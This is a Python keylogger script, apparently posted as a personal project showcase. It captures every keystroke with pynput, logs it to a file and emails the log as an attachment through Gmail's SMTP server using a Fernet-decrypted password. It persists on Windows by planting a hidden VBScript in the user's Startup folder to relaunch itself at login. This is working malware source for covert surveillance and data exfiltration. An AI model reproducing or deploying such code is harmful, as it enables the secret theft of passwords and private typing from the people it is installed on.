import datetime as dt
from pynput.keyboard import Listener
from cryptography.fernet import Fernet
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
import getpass, os, smtplib, time

def key_listener():
    
    init_time = time.time()
    
    # Format the current date and time for the log file name
    date_str = dt.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
    file_name = f'keylogger_{date_str}.txt'

    # Create a new file to store the keyboard log an open the file in writing mode
    with open(file_name, 'w') as f:

        def key_recorder(key):
            key = str(key)
            
            # This approach ensures that special characters and key actions are represented clearly in the log file, 
            # making it easier to read and interpret.
            if key == 'Key.enter':
                f.write('\n')
            elif key == 'Key.space':
                f.write(' ')
            elif key == 'Key.backspace':
                f.write('%BACKSPACE%')
            elif key == '<65027>':
                f.write('%AT%')
            else:
                f.write(key.replace("'", ""))
        
        # Listen to keyboard events
        with Listener(on_press=key_recorder) as listener:
            listener.join()
        
        # Save the file after 60 seconds elapsed, sends the email and finishes the program
        if time.time() - init_time > 60:
            f.close()
            send_email(file_name)
            quit()

def send_email(file_name):
    
    # To load the key correctly you must run previously in the same folder the 'pass_encripter' script
    # you can find it on my github repository (https://github.com/FranciscoJoseBonet/Python-Projects-Showcase/tree/main/password_encripter)
    def load_key():
        return open('pass.key', 'rb').read()
    
    key = load_key()
    fernt_obj = Fernet(key)
    encrypted_password = open('pass.enc', 'rb').read()
    password = fernt_obj.decrypt(encrypted_password).decode()  # Decode from bytes to string
    
    msg = MIMEMultipart()
    message = 'This text is included in the email'
    
    msg['From'] = 'test@example.com'  # Email address sending the log (ensure "less secure apps" access is enabled)
    msg['To'] = 'test@example.com'    # Email address receiving the log (can be the same as sender)
    msg['Subject'] = 'Log File'       # Email subject
    
    msg.attach(MIMEText(message, 'plain'))  # Add text to the email
    
    # Attach the log file to the mail
    with open(file_name, 'r') as attachment:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
        part.add_header('Content-Disposition', f"attachment; filename={file_name}")
        msg.attach(part)
    
    # Send the email
    with smtplib.SMTP('smtp.gmail.com', 587) as server:
        server.starttls()
        server.login(msg['From'], password)
        server.sendmail(msg['From'], msg['To'], msg.as_string())

# Add the script to the startup files on a windows device
def setup_startup():
    user_name = getpass.getuser()  # Get the current user name
    startup_path = f'C:\\Users\\{user_name}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
    script_path = os.path.dirname(os.path.abspath(__file__))  # Get the directory of the current script
    
    # Create a batch file to execute the keylogger at startup
    with open('open.bat', 'w+') as bat_f:
        bat_f.write(f'cd "{script_path}"\n')
        bat_f.write('python "keylogger.py"')
    
    # Create a VBScript file to run the batch file at startup
    with open(os.path.join(startup_path, 'open.vbs'), 'w+') as vbs_f:
        vbs_f.write('Dim WinscriptHost\n')
        vbs_f.write('Set WinScriptHost = CreateObject("WScript.Shell")\n')
        vbs_f.write(f'WinscriptHost.Run Chr(34) & "{script_path}\\open.bat" & Chr(34), 0\n')
        vbs_f.write('Set WinscriptHost = Nothing\n')
        
# To initialize the script when the os execute it from the Python compiler directly:
# (Remember having python installed)
if __name__ == '__main__':
    setup_startup()
    key_listener()
